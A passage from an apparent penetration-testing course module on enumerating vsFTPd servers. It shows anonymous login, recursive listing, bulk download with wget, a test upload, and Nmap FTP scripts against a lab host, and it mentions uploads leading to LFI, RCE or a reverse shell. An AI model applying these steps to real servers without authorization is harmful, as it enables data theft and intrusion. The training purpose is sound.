<th><strong>Setting</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>anonymous_enable=YES</code></td>
<td>Allowing anonymous login?</td>
</tr>
<tr>
<td><code>anon_upload_enable=YES</code></td>
<td>Allowing anonymous to upload files?</td>
</tr>
<tr>
<td><code>anon_mkdir_write_enable=YES</code></td>
<td>Allowing anonymous to create new directories?</td>
</tr>
<tr>
<td><code>no_anon_password=YES</code></td>
<td>Do not ask anonymous for password?</td>
</tr>
<tr>
<td><code>anon_root=/home/username/ftp</code></td>
<td>Directory for anonymous.</td>
</tr>
<tr>
<td><code>write_enable=YES</code></td>
<td>Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?</td>
</tr>
</tbody>
</table>
<p>With the standard FTP client (<code>ftp</code>), we can access the FTP server accordingly and log in with the anonymous user if the settings shown above have been used. The use of the anonymous account can occur in internal environments and infrastructures where the participants are all known. Access to this type of service can be set temporarily or with the setting to accelerate the exchange of files.</p>
<p>As soon as we connect to the vsFTPd server, the <code>response code 220</code> is displayed with the banner of the FTP server. Often this banner contains the description of the <code>service</code> and even the <code>version</code> of it. It also tells us what type of system the FTP server is. One of the most common configurations of FTP servers is to allow <code>anonymous</code> access, which does not require legitimate credentials but provides access to some files. Even if we cannot download them, sometimes just listing the contents is enough to generate further ideas and note down information that will help us in another approach.</p>
<p><strong>Anonymous Login</strong></p>
<p>FTP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ftp 10.129.14.136

Connected to 10.129.14.136.
220 "Welcome to the HTB Academy vsFTP service."
Name (10.129.14.136:cry0l1t3): anonymous

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.


ftp&gt; ls

200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--   <span class="hljs-number"> 1 </span>1002    <span class="hljs-number"> 1002 </span>    <span class="hljs-number"> 8138592 </span>Sep<span class="hljs-number"> 14 </span>16:54 Calender.pptx
drwxrwxr-x   <span class="hljs-number"> 2 </span>1002    <span class="hljs-number"> 1002 </span>       <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 14 </span>16:50 Clients
drwxrwxr-x   <span class="hljs-number"> 2 </span>1002    <span class="hljs-number"> 1002 </span>       <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 14 </span>16:50 Documents
drwxrwxr-x   <span class="hljs-number"> 2 </span>1002    <span class="hljs-number"> 1002 </span>       <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 14 </span>16:50 Employees
-rw-rw-r--   <span class="hljs-number"> 1 </span>1002    <span class="hljs-number"> 1002 </span>         <span class="hljs-number"> 41 </span>Sep<span class="hljs-number"> 14 </span>16:45 Important Notes.txt
226 Directory send OK.
</code></pre>
<p>However, to get the first overview of the server&#39;s settings, we can use the following command:</p>
<p><strong>vsFTPd Status</strong></p>
<p>FTP</p>
<pre><code class="lang-shell-session">ftp&gt; status

Connected <span class="hljs-keyword">to</span> <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.136</span>.
No proxy connection.
Connecting <span class="hljs-keyword">using</span> address family: any.
Mode: stream; Type: <span class="hljs-keyword">binary</span>; Form: non-print; <span class="hljs-keyword">Structure</span>: file
Verbose: <span class="hljs-keyword">on</span>; Bell: <span class="hljs-keyword">off</span>; Prompting: <span class="hljs-keyword">on</span>; Globbing: <span class="hljs-keyword">on</span>
Store unique: <span class="hljs-keyword">off</span>; Receive unique: <span class="hljs-keyword">off</span>
<span class="hljs-keyword">Case</span>: <span class="hljs-keyword">off</span>; CR stripping: <span class="hljs-keyword">on</span>
Quote control characters: <span class="hljs-keyword">on</span>
Ntrans: <span class="hljs-keyword">off</span>
Nmap: <span class="hljs-keyword">off</span>
Hash mark printing: <span class="hljs-keyword">off</span>; Use <span class="hljs-keyword">of</span> PORT cmds: <span class="hljs-keyword">on</span>
Tick counter printing: <span class="hljs-keyword">off</span>
</code></pre>
<p>Some commands should be used occasionally, as these will make the server show us more information that we can use for our purposes. These commands include <code>debug</code> and <code>trace</code>.</p>
<p><strong>vsFTPd Detailed Output</strong></p>
<p>FTP</p>
<pre><code class="lang-shell-session">ftp&gt; debug

Debugging on (debug=1).


ftp&gt; trace

Packet tracing on.


ftp&gt; ls

---&gt; PORT 10,10,14,4,188,195
200 PORT command successful. Consider using PASV.
---&gt; LIST
150 Here comes the directory listing.
-rw-rw-r--   <span class="hljs-number"> 1 </span>1002    <span class="hljs-number"> 1002 </span>    <span class="hljs-number"> 8138592 </span>Sep<span class="hljs-number"> 14 </span>16:54 Calender.pptx
drwxrwxr-x   <span class="hljs-number"> 2 </span>1002    <span class="hljs-number"> 1002 </span>       <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 14 </span>17:03 Clients
drwxrwxr-x   <span class="hljs-number"> 2 </span>1002    <span class="hljs-number"> 1002 </span>       <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 14 </span>16:50 Documents
drwxrwxr-x   <span class="hljs-number"> 2 </span>1002    <span class="hljs-number"> 1002 </span>       <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 14 </span>16:50 Employees
-rw-rw-r--   <span class="hljs-number"> 1 </span>1002    <span class="hljs-number"> 1002 </span>         <span class="hljs-number"> 41 </span>Sep<span class="hljs-number"> 14 </span>16:45 Important Notes.txt
226 Directory send OK.
</code></pre>
<table>
<thead>
<tr>
<th><strong>Setting</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>dirmessage_enable=YES</code></td>
<td>Show a message when they first enter a new directory?</td>
</tr>
<tr>
<td><code>chown_uploads=YES</code></td>
<td>Change ownership of anonymously uploaded files?</td>
</tr>
<tr>
<td><code>chown_username=username</code></td>
<td>User who is given ownership of anonymously uploaded files.</td>
</tr>
<tr>
<td><code>local_enable=YES</code></td>
<td>Enable local users to login?</td>
</tr>
<tr>
<td><code>chroot_local_user=YES</code></td>
<td>Place local users into their home directory?</td>
</tr>
<tr>
<td><code>chroot_list_enable=YES</code></td>
<td>Use a list of local users that will be placed in their home directory?</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th><strong>Setting</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>hide_ids=YES</code></td>
<td>All user and group information in directory listings will be displayed as &quot;ftp&quot;.</td>
</tr>
<tr>
<td><code>ls_recurse_enable=YES</code></td>
<td>Allows the use of recurse listings.</td>
</tr>
</tbody>
</table>
<p>In the following example, we can see that if the <code>hide_ids=YES</code> setting is present, the UID and GUID representation of the service will be overwritten, making it more difficult for us to identify with which rights these files are written and uploaded.</p>
<p><strong>Hiding IDs - YES</strong></p>
<p>FTP</p>
<pre><code class="lang-shell-session"><span class="hljs-keyword">ftp</span>&gt; ls

<span class="hljs-comment">---&gt; TYPE A</span>
<span class="hljs-number">200</span> Switching <span class="hljs-built_in">to</span> ASCII mode.
<span class="hljs-keyword">ftp</span>: setsockopt (ignored): Permission denied
<span class="hljs-comment">---&gt; PORT 10,10,14,4,223,101</span>
<span class="hljs-number">200</span> PORT <span class="hljs-keyword">command</span> <span class="hljs-title">successful</span>. <span class="hljs-title">Consider</span> <span class="hljs-title">using</span> <span class="hljs-title">PASV</span>.
<span class="hljs-comment">---&gt; LIST</span>
<span class="hljs-number">150</span> Here comes <span class="hljs-keyword">the</span> <span class="hljs-built_in">directory</span> listing.
-rw-rw-r<span class="hljs-comment">--    1 ftp     ftp      8138592 Sep 14 16:54 Calender.pptx</span>
drwxrwxr-x    <span class="hljs-number">2</span> <span class="hljs-keyword">ftp</span>     <span class="hljs-keyword">ftp</span>         <span class="hljs-number">4096</span> Sep <span class="hljs-number">14</span> <span class="hljs-number">17</span>:<span class="hljs-number">03</span> Clients
drwxrwxr-x    <span class="hljs-number">2</span> <span class="hljs-keyword">ftp</span>     <span class="hljs-keyword">ftp</span>         <span class="hljs-number">4096</span> Sep <span class="hljs-number">14</span> <span class="hljs-number">16</span>:<span class="hljs-number">50</span> Documents
drwxrwxr-x    <span class="hljs-number">2</span> <span class="hljs-keyword">ftp</span>     <span class="hljs-keyword">ftp</span>         <span class="hljs-number">4096</span> Sep <span class="hljs-number">14</span> <span class="hljs-number">16</span>:<span class="hljs-number">50</span> Employees
-rw-rw-r<span class="hljs-comment">--    1 ftp     ftp           41 Sep 14 16:45 Important Notes.txt</span>
-rw<span class="hljs-comment">-------    1 ftp     ftp            0 Sep 15 14:57 testupload.txt</span>
<span class="hljs-number">226</span> Directory <span class="hljs-built_in">send</span> OK.
</code></pre>
<p>This setting is a security feature to prevent local usernames from being revealed. With the usernames, we could attack the services like FTP and SSH and many others with a brute-force attack in theory. However, in reality, <a href="https://en.wikipedia.org/wiki/Fail2ban">fail2ban</a> solutions are now a standard implementation of any infrastructure that logs the IP address and blocks all access to the infrastructure after a certain number of failed login attempts.</p>
<p>Another helpful setting we can use for our purposes is the <code>ls_recurse_enable=YES</code>. This is often set on the vsFTPd server to have a better overview of the FTP directory structure, as it allows us to see all the visible content at once.</p>
<p><strong>Recursive Listing</strong></p>
<p>FTP</p>
<pre><code class="lang-shell-session">ftp&gt; ls -R

---&gt; PORT 10,10,14,4,222,149
200 PORT command successful. Consider using PASV.
---&gt; LIST -R
150 Here comes the directory listing.
.:
-rw-rw-r--   <span class="hljs-number"> 1 </span>ftp      ftp     <span class="hljs-number"> 8138592 </span>Sep<span class="hljs-number"> 14 </span>16:54 Calender.pptx
drwxrwxr-x   <span class="hljs-number"> 2 </span>ftp      ftp        <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 14 </span>17:03 Clients
drwxrwxr-x   <span class="hljs-number"> 2 </span>ftp      ftp        <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 14 </span>16:50 Documents
drwxrwxr-x   <span class="hljs-number"> 2 </span>ftp      ftp        <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 14 </span>16:50 Employees
-rw-rw-r--   <span class="hljs-number"> 1 </span>ftp      ftp          <span class="hljs-number"> 41 </span>Sep<span class="hljs-number"> 14 </span>16:45 Important Notes.txt
-rw-------   <span class="hljs-number"> 1 </span>ftp      ftp           <span class="hljs-number"> 0 </span>Sep<span class="hljs-number"> 15 </span>14:57 testupload.txt

./Clients:
drwx------   <span class="hljs-number"> 2 </span>ftp      ftp         <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 16 </span>18:04 HackTheBox
drwxrwxrwx   <span class="hljs-number"> 2 </span>ftp      ftp         <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 16 </span>18:00 Inlanefreight

./Clients/HackTheBox:
-rw-r--r--   <span class="hljs-number"> 1 </span>ftp      ftp        <span class="hljs-number"> 34872 </span>Sep<span class="hljs-number"> 16 </span>18:04 appointments.xlsx
-rw-r--r--   <span class="hljs-number"> 1 </span>ftp      ftp       <span class="hljs-number"> 498123 </span>Sep<span class="hljs-number"> 16 </span>18:04 contract.docx
-rw-r--r--   <span class="hljs-number"> 1 </span>ftp      ftp       <span class="hljs-number"> 478237 </span>Sep<span class="hljs-number"> 16 </span>18:04 contract.pdf
-rw-r--r--   <span class="hljs-number"> 1 </span>ftp      ftp          <span class="hljs-number"> 348 </span>Sep<span class="hljs-number"> 16 </span>18:04 meetings.txt

./Clients/Inlanefreight:
-rw-r--r--   <span class="hljs-number"> 1 </span>ftp      ftp        <span class="hljs-number"> 14211 </span>Sep<span class="hljs-number"> 16 </span>18:00 appointments.xlsx
-rw-r--r--   <span class="hljs-number"> 1 </span>ftp      ftp        <span class="hljs-number"> 37882 </span>Sep<span class="hljs-number"> 16 </span>17:58 contract.docx
-rw-r--r--   <span class="hljs-number"> 1 </span>ftp      ftp           <span class="hljs-number"> 89 </span>Sep<span class="hljs-number"> 16 </span>17:58 meetings.txt
-rw-r--r--   <span class="hljs-number"> 1 </span>ftp      ftp       <span class="hljs-number"> 483293 </span>Sep<span class="hljs-number"> 16 </span>17:59 proposal.pptx

./Documents:
-rw-r--r--   <span class="hljs-number"> 1 </span>ftp      ftp        <span class="hljs-number"> 23211 </span>Sep<span class="hljs-number"> 16 </span>18:05 appointments-template.xlsx
-rw-r--r--   <span class="hljs-number"> 1 </span>ftp      ftp        <span class="hljs-number"> 32521 </span>Sep<span class="hljs-number"> 16 </span>18:05 contract-template.docx
-rw-r--r--   <span class="hljs-number"> 1 </span>ftp      ftp       <span class="hljs-number"> 453312 </span>Sep<span class="hljs-number"> 16 </span>18:05 contract-template.pdf

./Employees:
226 Directory send OK.
</code></pre>
<p><code>Downloading</code> files from such an FTP server is one of the main features, as well as <code>uploading</code> files created by us. This allows us, for example, to use LFI vulnerabilities to make the host execute system commands. Apart from the files, we can view, download and inspect. Attacks are also possible with the FTP logs, leading to <code>Remote Command Execution</code> (<code>RCE</code>). This applies to the FTP services and all those we can detect during our enumeration phase.</p>
<p><strong>Download a File</strong></p>
<p>FTP</p>
<pre><code class="lang-shell-session"><span class="hljs-keyword">ftp</span>&gt; ls

<span class="hljs-number">200</span> PORT <span class="hljs-keyword">command</span> <span class="hljs-title">successful</span>. <span class="hljs-title">Consider</span> <span class="hljs-title">using</span> <span class="hljs-title">PASV</span>.
<span class="hljs-number">150</span> Here comes <span class="hljs-keyword">the</span> <span class="hljs-built_in">directory</span> listing.
-rwxrwxrwx    <span class="hljs-number">1</span> <span class="hljs-keyword">ftp</span>      <span class="hljs-keyword">ftp</span>             <span class="hljs-number">0</span> Sep <span class="hljs-number">16</span> <span class="hljs-number">17</span>:<span class="hljs-number">24</span> Calendar.pptx
drwxrwxrwx    <span class="hljs-number">4</span> <span class="hljs-keyword">ftp</span>      <span class="hljs-keyword">ftp</span>          <span class="hljs-number">4096</span> Sep <span class="hljs-number">16</span> <span class="hljs-number">17</span>:<span class="hljs-number">57</span> Clients
drwxrwxrwx    <span class="hljs-number">2</span> <span class="hljs-keyword">ftp</span>      <span class="hljs-keyword">ftp</span>          <span class="hljs-number">4096</span> Sep <span class="hljs-number">16</span> <span class="hljs-number">18</span>:<span class="hljs-number">05</span> Documents
drwxrwxrwx    <span class="hljs-number">2</span> <span class="hljs-keyword">ftp</span>      <span class="hljs-keyword">ftp</span>          <span class="hljs-number">4096</span> Sep <span class="hljs-number">16</span> <span class="hljs-number">17</span>:<span class="hljs-number">24</span> Employees
-rwxrwxrwx    <span class="hljs-number">1</span> <span class="hljs-keyword">ftp</span>      <span class="hljs-keyword">ftp</span>            <span class="hljs-number">41</span> Sep <span class="hljs-number">18</span> <span class="hljs-number">15</span>:<span class="hljs-number">58</span> Important Notes.txt
<span class="hljs-number">226</span> Directory <span class="hljs-built_in">send</span> OK.


<span class="hljs-keyword">ftp</span>&gt; <span class="hljs-built_in">get</span> Important\ Notes.txt

<span class="hljs-built_in">local</span>: Important Notes.txt remote: Important Notes.txt
<span class="hljs-number">200</span> PORT <span class="hljs-keyword">command</span> <span class="hljs-title">successful</span>. <span class="hljs-title">Consider</span> <span class="hljs-title">using</span> <span class="hljs-title">PASV</span>.
<span class="hljs-number">150</span> Opening BINARY mode data connection <span class="hljs-keyword">for</span> Important Notes.txt (<span class="hljs-number">41</span> <span class="hljs-keyword">bytes</span>).
<span class="hljs-number">226</span> Transfer complete.
<span class="hljs-number">41</span> <span class="hljs-keyword">bytes</span> received <span class="hljs-keyword">in</span> <span class="hljs-number">0.00</span> <span class="hljs-built_in">secs</span> (<span class="hljs-number">606.6525</span> kB/s)


<span class="hljs-keyword">ftp</span>&gt; exit

<span class="hljs-number">221</span> Goodbye.
</code></pre>
<p>FTP</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ ls | grep Notes.txt

<span class="hljs-string">'Important Notes.txt'</span>
</code></pre>
<p>We also can download all the files and folders we have access to at once. This is especially useful if the FTP server has many different files in a larger folder structure. However, this can cause alarms because no one from the company usually wants to download all files and content all at once.</p>
<p><strong>Download All Available Files</strong></p>
<p>FTP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136

-<span class="ruby">-<span class="hljs-number">2021</span>-09-<span class="hljs-number">19</span> <span class="hljs-number">14</span><span class="hljs-symbol">:</span><span class="hljs-number">45</span><span class="hljs-symbol">:</span><span class="hljs-number">58</span>--  <span class="hljs-symbol">ftp:</span>/<span class="hljs-regexp">/anonymous:*password*@10.129.14.136/</span>                                         
</span>           =<span class="ruby">&gt; <span class="hljs-number">10.129</span>.<span class="hljs-number">14.136</span>/.listing                                                                     
</span>Connecting to 10.129.14.136:21... connected.                                                               
Logging in as anonymous ... Logged in!
=<span class="ruby">=&gt; SYST ... done.    ==&gt; PWD ... done.
</span>=<span class="ruby">=&gt; TYPE I ... done.  ==&gt; CWD not needed.
</span>=<span class="ruby">=&gt; PORT ... done.    ==&gt; LIST ... done.                                                                 
</span>12.12.1.136/.listing           [ &lt;=&gt;                                  ]     466  --.-KB/s    in 0s       

2021-09-19 14:45:58 (65,8 MB/s) - 10.129.14.136/.listing saved [466]                                     
-<span class="ruby">-<span class="hljs-number">2021</span>-09-<span class="hljs-number">19</span> <span class="hljs-number">14</span><span class="hljs-symbol">:</span><span class="hljs-number">45</span><span class="hljs-symbol">:</span><span class="hljs-number">58</span>--  <span class="hljs-symbol">ftp:</span>/<span class="hljs-regexp">/anonymous:*password*@10.129.14.136/</span>Calendar.pptx   
</span>           =<span class="ruby">&gt; <span class="hljs-number">10.129</span>.<span class="hljs-number">14.136</span>/Calendar.pptx                                       
</span>=<span class="ruby">=&gt; CWD not required.                                                           
</span>=<span class="ruby">=&gt; SIZE Calendar.pptx ... done.                                                                                                                            
</span>=<span class="ruby">=&gt; PORT ... done.    ==&gt; RETR Calendar.pptx ... done.       
</span>
...SNIP...

2021-09-19 14:45:58 (48,3 MB/s) - 10.129.14.136/Employees/.listing saved [119]

FINISHED --2021-09-19 14:45:58--
Total wall clock time: 0,03s
Downloaded: 15 files, 1,7K in 0,001s (3,02 MB/s)
</code></pre>
<p>Once we have downloaded all the files, <code>wget</code> will create a directory with the name of the IP address of our target. All downloaded files are stored there, which we can then inspect locally.</p>
<p>FTP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ tree .

.
 <span class="hljs-number">10.129</span>.<span class="hljs-number">14.136</span>
     Calendar<span class="hljs-selector-class">.pptx</span>
     Clients
        Inlanefreight
            appointments<span class="hljs-selector-class">.xlsx</span>
            contract<span class="hljs-selector-class">.docx</span>
            meetings<span class="hljs-selector-class">.txt</span>
            proposal<span class="hljs-selector-class">.pptx</span>
     Documents
        appointments-template<span class="hljs-selector-class">.xlsx</span>
        contract-template<span class="hljs-selector-class">.docx</span>
        contract-template<span class="hljs-selector-class">.pdf</span>
     Employees
     Important Notes<span class="hljs-selector-class">.txt</span>

<span class="hljs-number">5</span> directories, <span class="hljs-number">9</span> files
</code></pre>
<p>Next, we can check if we have the permissions to upload files to the FTP server. Especially with web servers, it is common that files are synchronized, and the developers have quick access to the files. FTP is often used for this purpose, and most of the time, configuration errors are found on servers that the administrators think are not discoverable. The attitude that internal network components cannot be accessed from the outside means that the hardening of internal systems is often neglected and leads to misconfigurations.</p>
<p>The ability to upload files to the FTP server connected to a web server increases the likelihood of gaining direct access to the webserver and even a reverse shell that allows us to execute internal system commands and perhaps even escalate our privileges.</p>
<p><strong>Upload a File</strong></p>
<p>FTP</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ touch testupload.txt
</code></pre>
<p>With the <code>PUT</code> command, we can upload files in the current folder to the FTP server.</p>
<p>FTP</p>
<pre><code class="lang-shell-session">ftp&gt; put testupload.txt 

local: testupload.txt remote: testupload.txt
---&gt; PORT 10,10,14,4,184,33
200 PORT command successful. Consider using PASV.
---&gt; STOR testupload.txt
150 Ok to send data.
226 Transfer complete.


ftp&gt; ls

---&gt; TYPE A
200 Switching to ASCII mode.
---&gt; PORT 10,10,14,4,223,101
200 PORT command successful. Consider using PASV.
---&gt; LIST
150 Here comes the directory listing.
-rw-rw-r--   <span class="hljs-number"> 1 </span>1002    <span class="hljs-number"> 1002 </span>    <span class="hljs-number"> 8138592 </span>Sep<span class="hljs-number"> 14 </span>16:54 Calender.pptx
drwxrwxr-x   <span class="hljs-number"> 2 </span>1002    <span class="hljs-number"> 1002 </span>       <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 14 </span>17:03 Clients
drwxrwxr-x   <span class="hljs-number"> 2 </span>1002    <span class="hljs-number"> 1002 </span>       <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 14 </span>16:50 Documents
drwxrwxr-x   <span class="hljs-number"> 2 </span>1002    <span class="hljs-number"> 1002 </span>       <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 14 </span>16:50 Employees
-rw-rw-r--   <span class="hljs-number"> 1 </span>1002    <span class="hljs-number"> 1002 </span>         <span class="hljs-number"> 41 </span>Sep<span class="hljs-number"> 14 </span>16:45 Important Notes.txt
-rw-------   <span class="hljs-number"> 1 </span>1002    <span class="hljs-number"> 133 </span>           <span class="hljs-number"> 0 </span>Sep<span class="hljs-number"> 15 </span>14:57 testupload.txt
226 Directory send OK.
</code></pre>
<hr>
<h3 id="footprinting-the-service">Footprinting the Service</h3>
<p>Footprinting using various network scanners is also a handy and widespread approach. These tools make it easier for us to identify different services, even if they are not accessible on standard ports. One of the most widely used tools for this purpose is Nmap. Nmap also brings the <a href="https://nmap.org/book/nse.html">Nmap Scripting Engine</a> (<code>NSE</code>), a set of many different scripts written for specific services. More information on the capabilities of Nmap and NSE can be found in the <a href="https://academy.hackthebox.com/course/preview/network-enumeration-with-nmap">Network Enumeration with Nmap</a> module. We can update this database of NSE scripts with the command shown.</p>
<p><strong>Nmap FTP Scripts</strong></p>
<p>FTP</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo nmap --script-updatedb

Starting Nmap <span class="hljs-number">7.80</span> ( <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org ) at 2021-09-19 13:49 CEST</span>
<span class="hljs-string">NSE:</span> Updating rule database.
<span class="hljs-string">NSE:</span> Script Database updated successfully.
Nmap <span class="hljs-string">done:</span> <span class="hljs-number">0</span> IP addresses (<span class="hljs-number">0</span> hosts up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.28</span> seconds
</code></pre>
<p>All the NSE scripts are located on the Pwnbox in <code>/usr/share/nmap/scripts/</code>, but on our systems, we can find them using a simple command on our system.</p>
<p>FTP</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ find /</span> -type f -name ftp* <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span> | grep scripts

<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/ftp-syst.nse
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/ftp-vsftpd-backdoor.nse
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/ftp-vuln-cve2010<span class="hljs-number">-4221.</span>nse
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/ftp-proftpd-backdoor.nse
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/ftp-bounce.nse
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/ftp-libopie.nse
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/ftp-anon.nse
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/ftp-brute.nse
</code></pre>
<p>As we already know, the FTP server usually runs on the standard TCP port 21, which we can scan using Nmap. We also use the version scan (<code>-sV</code>), aggressive scan (<code>-A</code>), and the default script scan (<code>-sC</code>) against our target <code>10.129.14.136</code>.</p>
<p><strong>Nmap</strong></p>
<p>FTP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo nmap -sV -p21 -sC -A <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.136</span>

Starting Nmap <span class="hljs-number">7.80</span> ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2021</span><span class="hljs-number">-09</span><span class="hljs-number">-16</span> <span class="hljs-number">18</span>:<span class="hljs-number">12</span> CEST
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.136</span>
Host is up (<span class="hljs-number">0.00013</span>s latency).

PORT   STATE SERVICE VERSION
<span class="hljs-number">21</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">ftp</span>     vsftpd <span class="hljs-number">2.0</span><span class="hljs-number">.8</span> <span class="hljs-keyword">or</span> later
| <span class="hljs-keyword">ftp</span>-anon: Anonymous FTP login allowed (FTP code <span class="hljs-number">230</span>)
| -rwxrwxrwx    <span class="hljs-number">1</span> <span class="hljs-keyword">ftp</span>      <span class="hljs-keyword">ftp</span>       <span class="hljs-number">8138592</span> Sep <span class="hljs-number">16</span> <span class="hljs-number">17</span>:<span class="hljs-number">24</span> Calendar.pptx [NSE: writeable]
| drwxrwxrwx    <span class="hljs-number">4</span> <span class="hljs-keyword">ftp</span>      <span class="hljs-keyword">ftp</span>          <span class="hljs-number">4096</span> Sep <span class="hljs-number">16</span> <span class="hljs-number">17</span>:<span class="hljs-number">57</span> Clients [NSE: writeable]
| drwxrwxrwx    <span class="hljs-number">2</span> <span class="hljs-keyword">ftp</span>      <span class="hljs-keyword">ftp</span>          <span class="hljs-number">4096</span> Sep <span class="hljs-number">16</span> <span class="hljs-number">18</span>:<span class="hljs-number">05</span> Documents [NSE: writeable]
| drwxrwxrwx    <span class="hljs-number">2</span> <span class="hljs-keyword">ftp</span>      <span class="hljs-keyword">ftp</span>          <span class="hljs-number">4096</span> Sep <span class="hljs-number">16</span> <span class="hljs-number">17</span>:<span class="hljs-number">24</span> Employees [NSE: writeable]
| -rwxrwxrwx    <span class="hljs-number">1</span> <span class="hljs-keyword">ftp</span>      <span class="hljs-keyword">ftp</span>            <span class="hljs-number">41</span> Sep <span class="hljs-number">16</span> <span class="hljs-number">17</span>:<span class="hljs-number">24</span> Important Notes.txt [NSE: writeable]
|<span class="hljs-title">_-rwxrwxrwx</span>    <span class="hljs-number">1</span> <span class="hljs-keyword">ftp</span>      <span class="hljs-keyword">ftp</span>             <span class="hljs-number">0</span> Sep <span class="hljs-number">15</span> <span class="hljs-number">14</span>:<span class="hljs-number">57</span> testupload.txt [NSE: writeable]
| <span class="hljs-keyword">ftp</span>-syst: 
|   STAT: 
| FTP server status:
|      Connected <span class="hljs-built_in">to</span> <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.4</span>
|      Logged <span class="hljs-keyword">in</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">ftp</span>
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout <span class="hljs-keyword">in</span> <span class="hljs-built_in">seconds</span> is <span class="hljs-number">300</span>
|      Control connection is plain <span class="hljs-keyword">text</span>
|      Data connections will be plain <span class="hljs-keyword">text</span>
|      At session startup, client count was <span class="hljs-number">2</span>
|      vsFTPd <span class="hljs-number">3.0</span><span class="hljs-number">.3</span> - secure, fast, stable
|_End <span class="hljs-keyword">of</span> status
</code></pre>
<p>The default script scan is based on the services&#39; fingerprints, responses, and standard ports. Once Nmap has detected the service, it executes the marked scripts one after the other, providing different information. For example, the <a href="https://nmap.org/nsedoc/scripts/ftp-anon.html">ftp-anon</a> NSE script checks whether the FTP server allows anonymous access. If so, the contents of the FTP root directory are rendered for the anonymous user.</p>
<p>The <code>ftp-syst</code>, for example, executes the <code>STAT</code> command, which displays information about the FTP server status. This includes configurations as well as the version of the FTP server. Nmap also provides the ability to trace the progress of NSE scripts at the network level if we use the <code>--script-trace</code> option in our scans. This lets us see what commands Nmap sends, what ports are used, and what responses we receive from the scanned server.</p>
<p><strong>Nmap Script Trace</strong></p>
<p>FTP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo nmap -sV -p21 -sC -A <span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.136</span> --script-trace

Starting Nmap <span class="hljs-number">7.80</span> ( https://nmap.org ) <span class="hljs-meta">at</span> <span class="hljs-number">2021</span>-<span class="hljs-number">09</span>-<span class="hljs-number">19</span> <span class="hljs-number">13</span>:<span class="hljs-number">54</span> CEST                                                                                                                                                   
NSOCK INFO [<span class="hljs-number">11.</span>4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID <span class="hljs-number">8</span> [<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.136</span>:<span class="hljs-number">21</span>]                                   
NSOCK INFO [<span class="hljs-number">11.</span>4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID <span class="hljs-number">16</span> [<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.136</span>:<span class="hljs-number">21</span>]             
NSOCK INFO [<span class="hljs-number">11.</span>4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID <span class="hljs-number">24</span> [<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.136</span>:<span class="hljs-number">21</span>]
